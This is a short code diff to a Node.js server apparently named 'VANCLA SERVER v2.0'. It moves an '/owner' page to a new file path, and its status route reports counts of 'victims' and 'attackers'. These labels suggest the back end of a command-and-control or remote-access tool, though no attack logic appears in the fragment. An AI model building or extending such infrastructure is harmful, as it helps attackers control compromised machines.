@@ -445,7 +445,7 @@ setInterval(() => {
 }, 30000);
 
 // Serve owner web
-app.get('/owner', (req, res) => res.sendFile(path.join(__dirname, 'public', 'owner', 'index.html')));
+app.get('/owner', (req, res) => res.sendFile(path.join(__dirname, 'owner.html')));
 app.get('*', (req, res) => res.json({ service: 'VANCLA SERVER v2.0', status: 'online', victims: victims.size, attackers: attackers.size }));
 
 server.listen(PORT, '0.0.0.0', () => log(`VANCLA Server on port ${PORT}`));
